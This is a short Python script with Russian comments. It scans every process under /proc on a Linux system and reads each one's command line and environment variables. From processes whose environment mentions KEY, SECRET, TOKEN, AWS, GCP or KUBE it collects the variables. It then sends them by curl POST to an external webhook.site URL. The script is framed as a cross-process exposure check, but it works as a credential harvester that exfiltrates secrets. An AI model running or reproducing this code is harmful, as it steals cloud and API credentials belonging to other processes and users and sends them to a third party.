import os
import json
import subprocess

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def exploit_cross_pid_leak():
    leaked_data = []
    my_pid = os.getpid()

    # Перебираем все PID в системе
    for pid_dir in os.listdir('/proc'):
        if not pid_dir.isdigit():
            continue
        
        pid = int(pid_dir)
        if pid == my_pid: # Пропускаем себя
            continue

        try:
            # 1. Читаем cmdline, чтобы понять, что за процесс
            with open(f'/proc/{pid}/cmdline', 'rb') as f:
                cmd = f.read().replace(b'\0', b' ').decode(errors='ignore')
            
            # 2. Пытаемся прочитать переменные окружения (самое ценное)
            with open(f'/proc/{pid}/environ', 'rb') as f:
                env_raw = f.read().decode(errors='ignore')
                # Ищем только те процессы, где есть намеки на секреты
                if any(k in env_raw.upper() for k in ['KEY', 'SECRET', 'TOKEN', 'AWS', 'GCP', 'KUBE']):
                    # Очищаем вывод от нулевых байтов для JSON
                    env_clean = env_raw.replace('\0', '\n')
                    leaked_data.append({
                        "pid": pid,
                        "cmd": cmd,
                        "env": env_clean[:1000] # Берем первый килобайт данных
                    })
        except (PermissionError, FileNotFoundError):
            # Если доступа нет — это нормально для защищенной системы.
            # Если доступ ЕСТЬ — это критическая уязвимость.
            continue

    # Формируем финальный отчет
    report = {
        "VULNERABILITY": "CROSS_PROCESS_ENV_EXPOSURE",
        "status": "SUCCESS" if leaked_data else "FAILED_TO_READ_OTHERS",
        "found_leaks_count": len(leaked_data),
        "data": leaked_data
    }

    # Отправляем на хук
    subprocess.Popen([
        'curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json',
        '-d', json.dumps(report), WEBHOOK_URL
    ])

if __name__ == "__main__":
    exploit_cross_pid_leak()
